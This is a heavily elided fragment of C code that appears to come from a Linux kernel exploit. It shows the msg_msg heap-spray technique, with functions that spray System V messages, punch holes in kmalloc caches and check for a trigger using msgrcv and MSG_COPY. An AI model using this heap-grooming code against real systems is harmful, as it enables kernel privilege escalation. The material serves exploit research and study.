...
#define USER_DEFINED_MSG_TYPE  0xaa
#define HOLE_MSG_INDEX 500
...
int msg_msg_spray(int spray_count)
{
    ...
    message->mtype = USER_DEFINED_MSG_TYPE;
...
int msg_msg_make_hole()
{
    ...
    if (msgrcv(hole_target_queue, message, SPRAY_SIZE_KMALLOC_96, USER_DEFINED_MSG_TYPE, IPC_NOWAIT) < 0)
    {
...
int check_trigger(void)
{
    ...
    for (i = 0; i < MSG_MSG_SPRAY_COUNT; i++)
    {
        ...
        if (msgrcv(hole_target_queue, message, SPRAY_SIZE_KMALLOC_1024, USER_DEFINED_MSG_TYPE, MSG_COPY | IPC_NOWAIT))
        {
            perror("msg_msg_make_hole: msgrcv failed\n");
            exit(0);
        }
